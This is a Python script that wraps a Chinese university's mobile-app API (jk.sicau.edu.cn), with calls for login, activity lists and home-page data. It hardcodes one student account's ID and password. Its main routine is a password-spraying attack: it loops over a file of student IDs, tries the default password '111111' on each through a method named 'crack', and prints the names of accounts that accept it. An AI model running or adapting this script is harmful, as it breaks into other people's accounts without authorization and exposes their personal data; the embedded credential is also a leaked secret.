import requests


class GetStart:
    loginName = "201702420"
    password = "1314159@Dd"
    session = requests.session()
    getTokenHeaders = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'jk.sicau.edu.cn',
        'pu-version': '1.1.1',
        'User-Agent': 'PocketUniversity/1.1.1 (iPad; iOS 12.2; Scale/2.00)',
    }

    def headers(self):
        data = {
            "loginName": self.loginName,
            "password": self.password,
            "sid": "f1c97a0e81c24e98adb1ebdadca0699b"  # 川农的sid编号
        }
        r = self.session.post('https://jk.sicau.edu.cn/user/login/v1.0.0/snoLogin', data=data,
                              headers=self.getTokenHeaders)
        headers = {
            # 'Content-Type': 'multipart/form-data; boundary=Boundary+7A02C92264A7392E',
            'Host': 'jk.sicau.edu.cn',
            'User-Agent': 'PocketUniversity/1.1.1 (iPad; iOS 12.2; Scale/2.00)',
            'pu-version': '1.1.1',
            'x-access-token': r.json()['content']['token'],
        }
        return headers

    def crack(self):
        data = {
            "loginName": self.loginName,
            "password": self.password,
            "sid": "f1c97a0e81c24e98adb1ebdadca0699b"  # 川农的sid编号
        }
        r = self.session.post('https://jk.sicau.edu.cn/user/login/v1.0.0/snoLogin', data=data,
                              headers=self.getTokenHeaders, timeout=5)
        return r.json()['content']['name']


class Isicau(GetStart):
    # 获取活动列表
    def schoolAct(self):
        url = "https://jk.sicau.edu.cn/act/actInfo/v1.0.0/getUserSchoolActList"
        getUserSchoolActList = self.session.post(url, headers=self.headers())
        content = getUserSchoolActList.json()['content']
        actives = []
        for i in range(len(content)):
            active = content[i]
            actives.append({
                "title": active["title"],
                "typeName": active["typeName"],
                'addr': active['addr'],
                'canJoin': active['canJoin'],
                "startTime": active['startTime'],
                # "startUser": active['startUser'],
                # "startUserName": active["startUserName"],
                # "status": active['status'],
                "statusName": active['statusName'],
                "id": active['id']
            })
        return actives

    # 获取活动细节
    def actDetail(self):
        url = 'https://jk.sicau.edu.cn/act/actInfo/v1.0.0/getActDetail'
        data = {
            "actId": "100017022"
        }
        getActDetail = self.session.post(url=url, data=data, headers=self.headers())
        return getActDetail.json()

    # 获取主页信息
    def homePage(self):
        url = 'https://jk.sicau.edu.cn/user/homePage/v1.0.0/getHomePageApps'
        data = {
            "clientType": "1",
            "version": "V1.1.1"
        }
        getHomePage = self.session.post(url, data=data, headers=self.headers())
        return getHomePage.json()

    def floorsInfo(self):
        url = ''
        data = {
            "clientType": "1",
            "version": "V1.1.1"
        }
        getFloorsInfo = self.session.post(url, data=data, headers=self.headers())
        return getFloorsInfo.json()

    def schoolBroadCast(self):
        url = ''
        data = {
            "clientType": "1",
        }
        getSchoolBroadCast = self.session.post(url, data=data, headers=self.headers())
        return getSchoolBroadCast.json()


if __name__ == '__main__':
    inquire = Isicau()
    inquire.password = '111111'
    with open('./user_id', 'r') as f:
        users = f.readlines()
    for user in users:
        inquire.loginName = user[:-1]
        try:
            print(user[:-1], inquire.crack())
        except:
            # print(user[:-1], 'Wrong Password')
            pass
